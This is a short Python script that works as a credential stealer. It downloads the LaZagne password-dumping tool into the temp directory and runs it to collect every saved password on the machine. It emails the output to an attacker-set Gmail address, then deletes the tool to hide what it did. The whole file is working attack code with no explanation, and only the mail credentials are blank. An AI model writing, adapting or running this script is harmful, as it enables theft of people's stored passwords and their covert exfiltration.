import requests, subprocess, smtplib, os, tempfile
def download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(response.content)
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe")

result = subprocess.check_output(["LaZagne.exe","all"], shell=True)

send_mail("", "", result)

os.remove("LaZagne.exe")